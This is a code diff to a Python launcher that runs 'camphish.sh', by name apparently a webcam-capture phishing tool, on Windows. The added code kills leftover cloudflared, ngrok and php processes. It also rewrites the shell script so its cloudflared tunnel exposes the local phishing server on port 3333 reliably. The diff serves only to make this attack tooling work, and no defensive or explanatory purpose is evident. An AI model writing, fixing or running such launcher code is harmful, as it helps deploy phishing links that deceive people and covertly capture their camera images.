@@ -355,11 +355,44 @@ def main():
     print(f"[+] Bash    : {bash_cmd}")
     print()
 
+    # --- Kill stale tunnel processes from previous runs ---
+    for stale in ("cloudflared.exe", "ngrok.exe", "php.exe"):
+        try:
+            subprocess.run(
+                ["taskkill", "/F", "/IM", stale],
+                capture_output=True
+            )
+        except Exception:
+            pass
+
+    # --- Patch camphish.sh for Windows compatibility ---
+    patched_path = os.path.join(script_dir, "_camphish_patched.sh")
+    try:
+        with open(script_path, "r", errors="replace") as f:
+            content = f.read()
+
+        # Fix 1: Modern cloudflared uses --url not -url
+        content = content.replace(
+            "tunnel -url 127.0.0.1:3333",
+            "tunnel --url 127.0.0.1:3333"
+        )
+        # Fix 2: Give cloudflared 20 seconds instead of 10 to establish tunnel
+        content = content.replace("sleep 10\nlink=$(grep", "sleep 20\nlink=$(grep")
+
+        with open(patched_path, "w", newline="\n") as f:
+            f.write(content)
+
+        run_script = patched_path
+        print("[+] Script patched for Windows compatibility.")
+    except Exception as e:
+        print(f"[!] Could not patch script ({e}), using original.")
+        run_script = script_path
+
     # --- Run ---
     # Build a bash-format PATH so wget/unzip/php are visible inside bash
     bash_extra_dirs = [base_dir, script_dir]
     bash_path_prefix = ":".join(to_bash_path(d) for d in bash_extra_dirs if os.path.isdir(d))
-    bash_script = to_bash_path(script_path)
+    bash_script = to_bash_path(run_script)
 
     try:
         # Use bash -c to inject PATH in Unix format before running the script
